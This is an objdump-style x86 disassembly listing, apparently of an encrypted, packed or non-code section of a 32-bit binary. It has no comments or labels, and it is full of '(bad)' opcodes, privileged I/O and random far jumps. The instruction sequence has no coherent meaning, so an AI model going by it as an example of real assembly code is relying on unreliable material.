  40301e:	dec    ecx
  40301f:	cmc    
  403020:	fwait
  403021:	mov    eax,0xa0c087a2
  403026:	aad    0x9a
  403028:	(bad)  
  403029:	lock das 
  40302b:	test   al,0x86
  40302d:	jbe    0x4030ab
  40302f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403030:	out    0xc6,ax
  403033:	pusha  
  403034:	jecxz  0x40300b
  403036:	pop    es
  403037:	popf   
  403038:	sub    esi,edi
  40303a:	push   0xaba07b32
  40303f:	mov    eax,DWORD PTR [ecx-0x38]
  403042:	int    0x13
  403044:	pop    ebx
  403045:	adc    DWORD PTR [esi+ebp*1-0x213e513],ecx
  40304c:	xor    eax,0xf50b3bbc
  403051:	add    eax,0x698c97bc
  403057:	or     cl,BYTE PTR [edx+0x10]
  40305a:	ins    DWORD PTR es:[edi],dx
  40305b:	call   0x2497fd3c
  403060:	adc    BYTE PTR ds:0x2089cce7,ch
  403066:	call   FWORD PTR [esi+0x27fbfc2d]
  40306c:	out    0x3d,eax
  40306e:	sub    eax,0xe2c42eca
  403073:	dec    edx
  403074:	mov    esp,0x261a2f03
  403079:	rol    BYTE PTR [eax-0x45e71608],1
  40307f:	(bad)  
  403080:	shl    edi,1
  403082:	or     BYTE PTR [eax-0x756b5078],0x50
  403089:	fdiv   st(0),st
  40308b:	das    
  40308c:	cmp    al,0x67
  40308e:	sbb    al,0x9c
  403090:	cmp    BYTE PTR [edx-0x548ab908],dh
  403096:	push   cs
  403097:	cmp    al,BYTE PTR [esi]
  403099:	dec    edi
  40309a:	dec    edi
  40309b:	rcr    cl,0x1e
  40309e:	ret    0xb430
  4030a1:	sub    al,0x7
  4030a3:	pop    es
  4030a4:	dec    esp
  4030a5:	sbb    al,0x2f
  4030a7:	jg     0x4030e8
  4030a9:	leave  
  4030aa:	dec    esi
  4030ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030ac:	fsub   QWORD PTR [eax-0x28]
  4030af:	mov    BYTE PTR [ebp+0x6372f11a],ah
  4030b5:	into   
  4030b6:	data16 rcr BYTE PTR [esi+0x148e3e79],1
  4030bd:	fiadd  WORD PTR [ecx]
  4030bf:	mov    bl,0x1d
  4030c1:	xchg   ebp,eax
  4030c2:	mov    ecx,0xb32977fc
  4030c7:	test   BYTE PTR [eax+0x70],dl
  4030ca:	pop    edi
  4030cb:	loop   0x4030e6
  4030cd:	gs and al,0x81
  4030d0:	xor    dl,al
  4030d2:	ins    DWORD PTR es:[edi],dx
  4030d3:	mov    bl,0xe0
  4030d5:	pop    ds
  4030d6:	push   ebx
  4030d7:	xor    ebp,eax
  4030d9:	out    0xaa,al
  4030db:	push   0xffffffe9
  4030dd:	mov    al,0x48
  4030df:	mov    ds:0x2ca98c86,eax
  4030e4:	cdq    
  4030e5:	add    eax,0x4bb26d44
  4030ea:	data16 xor BYTE PTR [ebp-0x34],bl
  4030ee:	cli    
  4030ef:	adc    cl,ah
  4030f1:	inc    ecx
  4030f2:	in     al,dx
  4030f3:	add    cl,0x0
  4030f6:	rcr    DWORD PTR [ecx+edx*4-0x215480b4],0x17
  4030fe:	push   ds
  4030ff:	add    DWORD PTR [edx-0x27666e31],ebp
  403105:	jno    0x40311a
  403107:	mov    eax,ds:0x1e844cf5
  40310c:	outs   dx,BYTE PTR ds:[esi]
  40310d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40310f:	ret    0x7751
  403112:	call   0xcfae1bcb
  403117:	enter  0xaadc,0x3
  40311b:	stc    
  40311c:	sub    eax,0x8098041a
  403121:	jnp    0x4030b8
  403123:	sbb    al,0x4a
  403125:	and    eax,DWORD PTR [ebp+0x3b]
  403128:	mov    dh,0xfb
  40312a:	arpl   bx,si
  40312c:	adc    eax,0x976fcb65
  403131:	mul    DWORD PTR [ebx+ecx*1-0x6cf2bbf2]
  403138:	not    DWORD PTR [edi-0x40]
  40313b:	cwde   
  40313c:	add    edi,DWORD PTR [ecx-0x6c]
  40313f:	rol    DWORD PTR [eax-0x2f],0xd7
  403143:	shl    DWORD PTR [ebp-0x31],1
  403146:	cmp    eax,DWORD PTR [ebp-0x2c]
  403149:	test   eax,0x4f2ca591
  40314e:	jae    0x4030e6
  403150:	shl    BYTE PTR [edi+0x22],cl
  403153:	imul   ebp,DWORD PTR [edx+0x69],0xffffff86
  403157:	stos   DWORD PTR es:[edi],eax
  403158:	and    al,0xec
  40315a:	add    esi,DWORD PTR [ebx]
  40315c:	sub    dl,dl
  40315e:	shl    DWORD PTR [edi-0x2d1b32e7],cl
  403164:	(bad)  
  403166:	shl    DWORD PTR ds:0x916114c6,1
  40316c:	mov    bh,al
  40316e:	xor    esp,ecx
  403170:	adc    BYTE PTR [edx+0x6d],bh
  403173:	or     BYTE PTR [edi],al
  403175:	inc    edx
  403176:	xchg   ebx,eax
  403177:	jg     0x40316e
  403179:	mov    eax,0xfe150a0b
  40317e:	mov    ecx,0x4fe4452
  403183:	adc    BYTE PTR [edi],ah
  403185:	inc    esi
  403186:	cwde   
  403187:	mov    ch,0xfa
  403189:	(bad)  
  40318a:	fld    QWORD PTR [ebx+eiz*8]
  40318d:	sbb    bl,BYTE PTR [ebx+ecx*8+0x4c]
  403191:	cli    
  403192:	fs add eax,DWORD PTR cs:[edi]
  403196:	in     eax,dx
  403197:	fdivr  QWORD PTR [ebx]
  403199:	mov    eax,0x4636f5c9
  40319e:	mov    es,WORD PTR [eax+edi*8-0x511270f5]
  4031a5:	inc    esi
  4031a6:	mov    eax,0xaf76135b
  4031ab:	cs (bad) 
  4031ad:	cwde   
  4031ae:	sbb    eax,0x93c5c42f
  4031b3:	dec    esp
  4031b4:	mov    edx,ss
  4031b6:	cdq    
  4031b7:	hlt    
  4031b8:	xchg   al,ah
  4031ba:	pop    ds
  4031bb:	fstp   TBYTE PTR [ebp-0x1a]
  4031be:	jge    0x403231
  4031c0:	ret    
  4031c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031c2:	addr16 das 
  4031c4:	push   esi
  4031c5:	dec    BYTE PTR [edx+0x4a]
  4031c8:	or     esp,DWORD PTR [eax+ecx*8+0x185ebaa]
  4031cf:	std    
  4031d0:	addr16 fwait
  4031d2:	adc    eax,0x96ef3860
  4031d7:	out    0x1,eax
  4031d9:	dec    edx
  4031da:	xor    DWORD PTR [eax-0x19f226d4],eax
  4031e0:	xchg   BYTE PTR [edi+0x35],al
  4031e3:	inc    ebp
  4031e4:	push   esi
  4031e5:	xchg   edx,eax
  4031e6:	adc    dh,BYTE PTR [esi]
  4031e8:	retf   0x77c2
  4031eb:	pop    esi
  4031ec:	iret   
  4031ed:	cmp    al,0xb4
  4031ef:	daa    
  4031f0:	cmp    esi,DWORD PTR [ecx-0x79]
  4031f3:	jb     0x403247
  4031f5:	out    0x50,eax
  4031f7:	xchg   ebx,eax
  4031f8:	inc    esp
  4031f9:	fstp   QWORD PTR [edx]
  4031fb:	jb     0x40323f
  4031fd:	stos   DWORD PTR es:[edi],eax
  4031fe:	out    dx,al
  4031ff:	xchg   BYTE PTR [ecx-0x3f],bl
  403202:	push   ebp
  403203:	jge    0x40326d
  403205:	xor    cl,BYTE PTR [eax+0x41]
  403208:	mov    ebp,0xf18f83f5
  40320d:	inc    edi
  40320e:	in     eax,0xff
  403210:	js     0x4031a5
  403212:	(bad)  
  403213:	das    
  403214:	idiv   DWORD PTR [edx]
  403216:	xchg   edi,eax
  403217:	xchg   ebp,eax
  403218:	call   0xc1c2:0x457d277d
  40321f:	mov    eax,0x9504031d
  403224:	outs   dx,DWORD PTR ds:[esi]
  403225:	or     ebx,DWORD PTR [edi+0x34]
  403228:	add    BYTE PTR [edx-0x44],cl
  40322b:	cwde   
  40322c:	add    al,0x93
  40322e:	enter  0x35be,0x2f
  403232:	pop    ds
  403233:	out    0x3f,eax
  403235:	stos   BYTE PTR es:[edi],al
  403236:	aas    
  403237:	add    al,0x69
  403239:	aam    0x1e
  40323b:	ja     0x40329e
  40323d:	jne    0x40327d
  40323f:	std    
  403240:	push   esp
  403241:	xchg   dl,dh
  403243:	hlt    
  403244:	add    bh,BYTE PTR [ebx-0x52]
  403247:	std    
  403248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403249:	ror    ch,cl
  40324b:	mov    ebp,0x6033ee89
  403250:	das    
  403251:	jmp    0x4031da
  403253:	mov    edi,0xd5d4d836
  403258:	(bad)  [edx+0x2603a15a]
  40325e:	jle    0x4031e8
  403260:	fwait
  403261:	call   0xf0730bce
  403266:	cmp    DWORD PTR [edi+0x65c2b433],esi
  40326c:	das    
  40326d:	add    al,0xfd
  40326f:	sub    dl,BYTE PTR [eax+ebp*8-0x1d4598e7]
  403276:	mov    ah,0x2c
  403278:	or     esp,DWORD PTR [ebx+0x48]
  40327b:	out    0x9,al
  40327d:	adc    DWORD PTR [ecx],ebx
  40327f:	dec    esi
  403280:	inc    eax
  403281:	in     al,dx
  403282:	jle    0x40320a
  403284:	jno    0x403246
  403286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403287:	aam    0x37
  403289:	mov    edi,0x938b921a
  40328e:	add    al,0x41
  403290:	or     eax,0xc991726f
  403295:	mov    esi,0x8e056382
  40329a:	std    
  40329b:	jne    0x40325c
  40329d:	pop    esp
  40329e:	fiadd  DWORD PTR [eax+0x1a]
  4032a1:	xchg   BYTE PTR [eax],ch
  4032a3:	into   
  4032a4:	call   0xf8ece491
  4032a9:	adc    al,0xe6
  4032ab:	ficomp DWORD PTR ss:[esi]
  4032ae:	repz push ebp
  4032b0:	push   ebp
  4032b1:	xor    esi,0xffffffd3
  4032b4:	test   BYTE PTR [esp+ebx*4+0x62],bh
  4032b8:	mov    DWORD PTR [edx+0x6d2e9180],esi
  4032be:	push   esp
  4032bf:	sar    BYTE PTR [ebp+ecx*2+0x7],1
  4032c3:	and    edx,DWORD PTR [eax+edx*1-0x2930ffa9]
  4032ca:	dec    eax
  4032cb:	fwait
  4032cc:	sub    ah,BYTE PTR [edi-0x84a5660]
  4032d2:	jmp    0x77bf:0xd772886d
  4032d9:	adc    al,0xd0
  4032db:	ret    0x8ed6
  4032de:	fiadd  DWORD PTR [eax]
  4032e0:	xchg   esp,eax
  4032e1:	push   ebx
  4032e2:	(bad)  
  4032e3:	mov    esp,0xd7ae6409
  4032e8:	int    0x8e
  4032ea:	jo     0x4032a1
  4032ec:	jle    0x403353
  4032ee:	cld    
  4032ef:	cmp    al,ch
  4032f1:	xchg   ebx,eax
  4032f2:	push   ebp
  4032f3:	aad    0xbd
  4032f5:	or     esp,DWORD PTR [edx-0x46]
  4032f8:	dec    edi
  4032f9:	jl     0x4032a9
  4032fb:	cmovnp esi,DWORD PTR [edi+0x68f0145a]
  403302:	dec    esp
  403303:	add    eax,0xe105dd94
  403308:	mov    cs,esp
  40330a:	dec    esi
  40330b:	mov    bl,0xbe
  40330d:	imul   ebp,ebx,0x7d73620
  403313:	and    dh,BYTE PTR [edi+0x3568a937]
  403319:	shl    DWORD PTR [eax+0x4117d6e],1
  40331f:	ins    DWORD PTR es:[edi],dx
  403320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403321:	popa   
  403322:	lock push 0x4e7f5458
  403328:	pop    eax
  403329:	mov    ds:0x7d03e45d,al
  40332e:	cmc    
  40332f:	cwde   
  403330:	test   al,0x55
  403332:	add    eax,0x48d6b947
  403337:	mov    edi,esi
  403339:	inc    esp
  40333a:	inc    edx
  40333b:	fmul   DWORD PTR [ebp+0x476326ff]
  403341:	imul   esi,DWORD PTR [esi],0x9adcf4b2
  403347:	lods   eax,DWORD PTR ds:[esi]
  403348:	(bad)  
  403349:	or     al,0x56
  40334b:	pusha  
  40334c:	and    DWORD PTR [esi-0x68200a7],0xffffffe6
  403353:	addr16 push 0x3058de60
  403359:	mov    cl,0xbc
  40335b:	lahf   
  40335c:	int    0x34
  40335e:	scas   eax,DWORD PTR es:[edi]
  40335f:	pop    ebp
  403360:	mul    edx
  403362:	fadd   st,st(0)
  403364:	loop   0x403335
  403366:	or     al,BYTE PTR [ebx-0x17f84cf3]
  40336c:	push   ecx
  40336d:	push   ebx
  40336e:	mov    WORD PTR [ebx],cs
  403370:	adc    al,BYTE PTR [ecx+esi*8-0x66fea2a1]
  403377:	inc    ecx
  403378:	ins    DWORD PTR es:[edi],dx
  403379:	inc    eax
  40337a:	aam    0xc2
  40337c:	(bad)  
  40337e:	push   es
  40337f:	popf   
  403380:	rcl    BYTE PTR fs:[ebp-0x2f],0x4d
  403385:	dec    edi
  403386:	or     dl,BYTE PTR [ebp-0x3bf950d1]
  40338c:	push   edi
  40338d:	and    al,ch
  40338f:	xchg   edi,esi
  403391:	cmp    BYTE PTR [edx+0x46],cl
  403394:	cs push ebp
  403396:	dec    eax
  403397:	add    DWORD PTR [esi-0x119d2397],0x18c87d08
  4033a1:	pop    edi
  4033a2:	sub    DWORD PTR [ebp-0x42],edx
  4033a5:	xor    BYTE PTR [ebx-0x702cdc90],dh
  4033ab:	in     eax,dx
  4033ac:	xchg   BYTE PTR [ecx+0x6a16009e],ah
  4033b2:	xchg   BYTE PTR [esi+0x40],bh
  4033b5:	push   eax
  4033b6:	loope  0x4033f5
  4033b8:	in     eax,dx
  4033b9:	dec    ecx
  4033ba:	enter  0x45dc,0x49
  4033be:	push   0xb436bdba
  4033c3:	sub    DWORD PTR [ebp-0xbd6bcb9],eax
  4033c9:	pusha  
  4033ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033cb:	out    dx,eax
  4033cc:	data16 and BYTE PTR [esi],dl
  4033cf:	aad    0xc4
  4033d1:	pop    ecx
  4033d2:	xor    edi,DWORD PTR [edi+0x2b457222]
  4033d8:	jmp    0x5c7b:0x5a399cf1
  4033df:	xchg   ecx,eax
  4033e0:	push   ds
  4033e1:	in     al,dx
  4033e2:	jne    0x4033b5
  4033e4:	adc    eax,0xfb72514
  4033e9:	jmp    0xe44e:0x4d292a4a
  4033f0:	push   esp
  4033f1:	fstp   st(4)
  4033f3:	add    DWORD PTR [esp+ebx*1],ebp
  4033f6:	fwait
  4033f7:	sub    ecx,DWORD PTR [edi-0x20]
  4033fa:	and    edx,0xfffffff6
  4033fd:	sub    edi,DWORD PTR [esi]
  4033ff:	call   0x512:0xd6f2f9e
  403406:	mov    ebx,0x6627e50a
  40340b:	or     eax,0x195abf7e
  403410:	pop    ecx
  403411:	(bad)  
  403412:	adc    cl,BYTE PTR [ebx+0x5934cbdc]
  403418:	ds xchg edx,eax
  40341a:	ds cli 
  40341c:	int    0x52
  40341e:	shl    DWORD PTR [eax],0x16
  403421:	aad    0xe6
  403423:	jmp    0xc33f:0x806ef782
  40342a:	push   0x45
  40342c:	inc    ebp
  40342d:	adc    ecx,DWORD PTR [ecx-0x1b]
  403430:	xchg   esi,eax
  403431:	ins    DWORD PTR es:[edi],dx
  403432:	mov    dl,0x8d
  403434:	pop    eax
  403435:	(bad)  
  403436:	jne    0x403405
  403438:	bound  edi,QWORD PTR [ebx]
  40343a:	int    0x84
  40343c:	test   BYTE PTR [ebp+0x408f587d],ah
  403442:	lea    edi,ds:[ecx+0x8893e63]
  403449:	into   
  40344a:	aaa    
  40344b:	mov    BYTE PTR [edi-0x6],al
  40344e:	pop    edi
  40344f:	dec    esp
  403450:	dec    eax
  403451:	jno    0x4034b4
  403453:	cmp    DWORD PTR [eax+0x73],ebx
  403456:	loope  0x40340b
  403458:	push   0xf18d198f
  40345d:	lods   al,BYTE PTR ds:[esi]
  40345e:	stos   BYTE PTR es:[edi],al
  40345f:	les    esp,FWORD PTR [eax+ebx*4]
  403462:	adc    dl,BYTE PTR [esi-0x14c9098a]
  403468:	fidiv  DWORD PTR [ecx+0x382ae469]
  40346e:	das    
  40346f:	jns    0x4034c8
  403471:	cs stos WORD PTR es:[edi],ax
  403474:	(bad)  
  403475:	sahf   
  403476:	xchg   DWORD PTR [eax-0x70],edx
  403479:	xchg   edx,eax
  40347a:	into   
  40347b:	cs nop
  40347d:	mov    bl,0xd3
  40347f:	mov    esp,0xa79b205c
  403484:	push   esp
  403485:	xchg   ecx,eax
  403486:	adc    esi,DWORD PTR [eax-0x1e]
  403489:	push   ebp
  40348a:	pop    esi
  40348b:	mov    ebp,0xeaae3f6
  403490:	aas    
  403491:	or     bl,BYTE PTR [edx-0x55]
  403494:	arpl   WORD PTR [ebp-0xc11b022],dx
  40349a:	pushf  
  40349b:	mov    edi,ss
  40349d:	loope  0x403489
  40349f:	mov    cl,0x7b
  4034a1:	xor    BYTE PTR [esi+0x34],ch
  4034a4:	das    
  4034a5:	push   ss
  4034a6:	sub    eax,0xd56f6629
  4034ab:	int3   
  4034ac:	fidiv  DWORD PTR [ebx*4+0x46bf3d1a]
  4034b3:	int    0x3
  4034b5:	sbb    eax,0x990bdabe
  4034ba:	stos   DWORD PTR es:[edi],eax
  4034bb:	push   edi
  4034bc:	loopne 0x403488
  4034be:	mov    edi,DWORD PTR [ebx-0x2fbda0b8]
  4034c4:	push   edi
  4034c5:	cwde   
  4034c6:	addr16 jbe 0x403514
  4034c9:	fmul   DWORD PTR [edx]
  4034cb:	iret   
  4034cc:	or     ebp,edi
  4034ce:	dec    ebx
  4034cf:	arpl   WORD PTR [edi+0x5d],dx
  4034d2:	fsubr  DWORD PTR [edx+0x21]
  4034d5:	mov    gs,esi
  4034d7:	cdq    
  4034d8:	push   0x3d
  4034da:	dec    edx
  4034db:	push   ss
  4034dc:	cld    
  4034dd:	int    0xf
  4034df:	out    0xe9,al
  4034e1:	jmp    0x2fc9a33e
  4034e6:	or     DWORD PTR [edi-0x39],ecx
  4034e9:	inc    esi
  4034ea:	or     BYTE PTR [ebx+0x110b46],dh
  4034f0:	pop    eax
  4034f1:	outs   dx,BYTE PTR ds:[esi]
  4034f2:	push   ebp
  4034f3:	push   ebx
  4034f4:	neg    BYTE PTR [esi-0x59]
  4034f7:	push   eax
  4034f8:	push   ecx
  4034f9:	jle    0x4034ef
  4034fb:	shl    cl,cl
  4034fd:	cdq    
  4034fe:	mov    ecx,0x7a4ccda9
  403503:	mov    esp,0x8ff1b276
  403508:	(bad)  
  403509:	scas   al,BYTE PTR es:[edi]
  40350a:	cmp    dl,dh
  40350c:	push   ds
  40350d:	jge    0x4034ce
  40350f:	lea    edi,[edx+ebp*4-0x6c]
  403513:	mov    ecx,0xd28da130
  403518:	lahf   
  403519:	loope  0x403514
  40351b:	xor    BYTE PTR [edi],0xe8
  40351e:	push   ebx
  40351f:	xchg   ebx,eax
  403520:	push   esi
  403521:	cmp    DWORD PTR [eax+0x7],ebp
  403524:	(bad)  
  403525:	loope  0x4034c9
  403527:	cmp    DWORD PTR [esi-0x354894df],esp
  40352d:	adc    al,0xf
  40352f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403530:	mov    cl,al
  403532:	jae    0x40357e
  403534:	(bad)  
  403536:	xchg   DWORD PTR [eax+0x23],esp
  403539:	xchg   DWORD PTR [esi],ebp
  40353b:	push   ss
  40353c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40353d:	pop    ss
  40353e:	mov    ch,0x73
  403540:	mov    eax,0x416cf44e
  403545:	cmp    al,0x6
  403547:	icebp  
  403548:	out    0x38,al
  40354a:	popf   
  40354b:	push   edx
  40354c:	adc    bh,0x9a
  40354f:	sub    ah,BYTE PTR [edi]
  403551:	jne    0x4035cc
  403553:	lods   eax,DWORD PTR ds:[esi]
  403554:	dec    esp
  403555:	xchg   edi,eax
  403556:	aaa    
  403557:	jne    0x4034f8
  403559:	enter  0xfc21,0xc2
  40355d:	push   eax
  40355e:	lods   eax,DWORD PTR ds:[esi]
  40355f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403560:	daa    
  403561:	loope  0x4034f3
  403563:	popa   
  403564:	add    BYTE PTR [edx+eax*2+0x2a],cl
  403568:	ins    DWORD PTR es:[edi],dx
  403569:	fidivr DWORD PTR [ebx]
  40356b:	scas   al,BYTE PTR es:[edi]
  40356c:	in     al,dx
  40356d:	push   ss
  40356e:	xchg   edi,eax
  40356f:	adc    eax,0xbf5e2919
  403574:	add    edx,eax
  403576:	fwait
  403577:	xor    DWORD PTR [edi],edi
  403579:	inc    esi
  40357a:	adc    BYTE PTR [esi+0x75],ch
  40357d:	loopne 0x4035f0
  40357f:	and    eax,0xeb01aaa
  403584:	xchg   dh,dh
  403586:	jbe    0x403542
  403588:	into   
  403589:	fwait
  40358a:	and    dl,BYTE PTR [eax]
  40358c:	jo     0x403574
  40358e:	and    cl,BYTE PTR [esi+ebp*4-0x34]
  403592:	popa   
  403593:	dec    ebp
  403594:	mov    esp,0x81871fc
  403599:	or     al,0xcb
  40359b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40359c:	jmp    0x403597
  40359e:	adc    DWORD PTR [ebx],ebx
  4035a0:	pushf  
  4035a1:	daa    
  4035a2:	adc    edx,esp
  4035a4:	jmp    0x4035eb
  4035a6:	stos   DWORD PTR es:[edi],eax
  4035a7:	dec    esp
  4035a8:	and    BYTE PTR [ebx+ebx*4],cl
  4035ab:	das    
  4035ac:	xor    DWORD PTR [esi+0x6d],eax
  4035af:	pop    ecx
  4035b0:	fwait
  4035b1:	cmp    BYTE PTR [eax+0x1a],dh
  4035b4:	pop    eax
  4035b5:	jg     0x403541
  4035b7:	inc    edi
  4035b8:	inc    edx
  4035b9:	pop    ebp
  4035ba:	call   0x9e3b:0xf9722265
  4035c1:	imul   ebp,eax
  4035c4:	dec    esi
  4035c5:	pop    ebp
  4035c6:	add    DWORD PTR [edi+eax*4],0xbf47a196
  4035cd:	ret    
  4035ce:	cs xchg ecx,eax
  4035d0:	adc    eax,0xec1de817
  4035d5:	sahf   
  4035d6:	mov    eax,0x8c448d1e
  4035db:	push   ebx
  4035dc:	(bad)  
  4035dd:	repz fdivr st(5),st
  4035e0:	hlt    
  4035e1:	(bad)  
  4035e2:	sti    
  4035e3:	dec    ecx
  4035e4:	cmp    bh,bh
  4035e6:	and    ch,ah
  4035e8:	ror    DWORD PTR [esp+ecx*1],1
  4035eb:	dec    ebp
  4035ec:	das    
  4035ed:	fwait
  4035ee:	stc    
  4035ef:	sub    ecx,ebx
  4035f1:	mov    al,0x94
  4035f3:	or     BYTE PTR [ecx-0x7e],ah
  4035f6:	bound  ecx,QWORD PTR [edx+0x66ee0ea5]
  4035fc:	(bad)  
  4035fd:	in     al,dx
  4035fe:	dec    eax
  4035ff:	mov    dl,0xc5
  403601:	mov    bl,0x4
  403603:	xchg   DWORD PTR [ebx-0x7d],ebp
  403606:	sar    BYTE PTR [ebx-0xc],1
  403609:	add    eax,0xa79e19ff
  40360e:	and    al,0x36
  403610:	sti    
  403611:	xlat   BYTE PTR ds:[ebx]
  403612:	rcl    DWORD PTR [esi],1
  403614:	icebp  
  403615:	(bad)  
  403617:	mov    esi,0xb41f8905
  40361c:	fisubr DWORD PTR [edi]
  40361e:	jo     0x403613
  403620:	imul   ebp,DWORD PTR [esi-0x47],0x108b2b1d
  403627:	lock cdq 
  403629:	popa   
  40362a:	mov    esp,0x8e3c27c8
  40362f:	dec    edi
  403630:	xor    al,BYTE PTR [esi]
  403632:	jns    0x4035ef
  403634:	cmp    al,0x84
  403636:	push   ecx
  403637:	push   esi
  403638:	sahf   
  403639:	add    dh,BYTE PTR [eax+0x41408cd7]
  40363f:	sub    dl,ah
  403641:	mov    ch,0xc3
  403643:	aaa    
  403644:	aaa    
  403645:	jnp    0x4035d9
  403647:	add    al,ah
  403649:	or     DWORD PTR [edx-0x4a],esp
  40364c:	or     BYTE PTR [esi+edx*1+0x5f],bl
  403650:	out    dx,al
  403651:	add    bh,BYTE PTR [ebp-0x40901c2a]
  403657:	cwde   
  403658:	adc    al,0xd1
  40365a:	(bad)  
  40365b:	scas   eax,DWORD PTR es:[edi]
  40365c:	stc    
  40365d:	fcmovb st,st(4)
  40365f:	add    al,0x8a
  403661:	or     DWORD PTR [ebp+ebp*4+0x4e61197c],0xc0105ad0
  40366c:	call   0xa5ae:0x7e4b1b4c
  403673:	leave  
  403674:	inc    esi
  403676:	retf   
  403677:	add    eax,0x9099d8b
  40367c:	push   ebp
  40367d:	and    ebp,ebp
  40367f:	mov    eax,0x5affb1cb
  403684:	pop    edi
  403685:	adc    DWORD PTR [esi+eax*1],eax
  403688:	(bad)  
  403689:	clc    
  40368a:	push   ebp
  40368b:	ins    BYTE PTR es:[edi],dx
  40368c:	jo     0x4036df
  40368e:	pop    edx
  40368f:	cmp    ah,ch
  403691:	or     esp,0x5d
  403694:	outs   dx,DWORD PTR ds:[esi]
  403695:	adc    DWORD PTR [ebx+0x69f14ca5],edx
  40369b:	les    edi,FWORD PTR [eax+0x2e]
  40369e:	cmp    eax,0x532c8281
  4036a3:	mov    edx,0x770a0d1f
  4036a8:	cmp    DWORD PTR [eax+edx*1-0x6a25e6c2],edi
  4036af:	pop    edi
  4036b0:	and    DWORD PTR [eax+eax*2+0x2b],esi
  4036b4:	mov    ah,cl
  4036b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036b7:	jnp    0x403680
  4036b9:	mov    bl,0xd3
  4036bb:	into   
  4036bc:	pop    ebx
  4036bd:	fdivr  QWORD PTR [esi+esi*8]
  4036c0:	out    0x12,al
  4036c2:	jnp    0x40371b
  4036c4:	fld    DWORD PTR [eax-0x670792a3]
  4036ca:	or     dl,ch
  4036cc:	cdq    
  4036cd:	jmp    0x4036b8
  4036cf:	iret   
  4036d0:	xchg   edx,eax
  4036d1:	mov    cl,0x1a
  4036d3:	mov    ch,0x22
  4036d5:	clc    
  4036d6:	ss idiv esi
  4036d9:	lea    eax,[ecx]
  4036db:	add    DWORD PTR [ebx+eiz*8],esp
  4036de:	sub    eax,0xfa4c1a6f
  4036e3:	adc    eax,0x3807e448
  4036e8:	inc    edx
  4036e9:	ja     0x4036b2
  4036eb:	inc    DWORD PTR [esi]
  4036ed:	ins    BYTE PTR es:[edi],dx
  4036ee:	rcr    DWORD PTR [eax+0x22505a82],0xa1
  4036f5:	sbb    DWORD PTR [eax-0x2a],ebp
  4036f8:	sahf   
  4036f9:	sahf   
  4036fa:	jmp    0x4036e0
  4036fc:	loope  0x40377b
  4036fe:	cmp    ecx,edi
  403700:	adc    al,0x8b
  403702:	jo     0x40372b
  403704:	ins    BYTE PTR es:[edi],dx
  403705:	mov    ebx,0x61f0d79f
  40370a:	adc    ebp,DWORD PTR [eax+0x5091aa7e]
  403710:	into   
  403711:	jmp    0x829e:0x38141341
  403718:	adc    DWORD PTR [edx-0x5b],ebp
  40371b:	or     al,0x61
  40371d:	mov    al,ds:0xd4bebb5d
  403722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403723:	jg     0x4036b3
  403725:	dec    edi
  403726:	outs   dx,DWORD PTR ds:[esi]
  403727:	enter  0x6ff,0xc9
  40372b:	test   DWORD PTR [eax+ecx*2+0x59736253],ecx
  403732:	inc    ecx
  403733:	inc    ebx
  403734:	rol    DWORD PTR [ebx+0x4b1a90a8],0x64
  40373b:	gs out dx,al
  40373d:	jbe    0x403738
  40373f:	push   edi
  403740:	in     eax,dx
  403741:	push   0xce844653
  403746:	pop    eax
  403747:	push   0x4e02c990
  40374c:	daa    
  40374d:	mov    fs,eax
  40374f:	mov    bl,0xd0
  403751:	ja     0x4037a4
  403753:	jne    0x403747
  403755:	icebp  
  403756:	rcl    BYTE PTR [ebx],1
  403758:	jns    0x4037c1
  40375a:	repz rol edi,cl
  40375d:	push   ds
  40375e:	push   cs
  40375f:	mov    dh,0x8
  403761:	cwde   
  403762:	mov    dl,0x53
  403764:	sub    DWORD PTR [ebx],ecx
  403766:	retf   
  403767:	div    BYTE PTR [ecx+ecx*4-0x2b]
  40376b:	xor    al,0xb2
  40376d:	xchg   ecx,eax
  40376e:	mov    BYTE PTR [edi],bl
  403770:	inc    esi
  403771:	nop
  403772:	setno  BYTE PTR [eax-0x26638680]
  403779:	sbb    eax,0xcd35a275
  40377e:	(bad)  [edx]
  403780:	inc    ebp
  403781:	sti    
  403782:	jp     0x4037cb
  403784:	jg     0x403734
  403786:	jns    0x40371c
  403788:	test   eax,0x6b68c78a
  40378d:	cmp    DWORD PTR [edx-0x2e2b3a29],edi
  403793:	xor    ebx,eax
  403795:	adc    bh,BYTE PTR [ebx+eiz*1]
  403798:	adc    DWORD PTR [esi+0x6d],ebp
  40379b:	jb     0x4037c6
  40379d:	xor    ah,ch
  40379f:	(bad)  
  4037a0:	out    dx,al
  4037a1:	jbe    0x4037ba
  4037a3:	adc    esi,DWORD PTR [ebp-0x723a4a5d]
  4037a9:	mov    edi,DWORD PTR [ebx-0x2d541a8a]
  4037af:	add    al,0x4f
  4037b1:	sub    DWORD PTR [ebp+0x11],0x7f
  4037b5:	jb     0x4037f6
  4037b7:	(bad)  
  4037b8:	rol    BYTE PTR [eax+0x26],1
  4037bb:	inc    edi
  4037bc:	lods   al,BYTE PTR ds:[esi]
  4037bd:	sub    al,0xc0
  4037bf:	sbb    eax,0xe365af30
  4037c4:	or     ebp,ebx
  4037c6:	cld    
  4037c7:	aas    
  4037c8:	add    DWORD PTR ds:0xe9c3b8ae,eax
  4037ce:	xor    al,0xb8
  4037d0:	or     al,BYTE PTR [ebx]
  4037d2:	ds clc 
  4037d4:	xor    DWORD PTR [edi+0x6b],ecx
  4037d7:	data16 jbe 0x40383d
  4037da:	add    bh,al
  4037dc:	int    0x10
  4037de:	das    
  4037df:	test   BYTE PTR [eax],ah
  4037e1:	inc    edi
  4037e2:	push   edi
  4037e3:	ja     0x4037c7
  4037e5:	mov    dh,0x9d
  4037e7:	add    eax,0xf1450fd6
  4037ec:	inc    edi
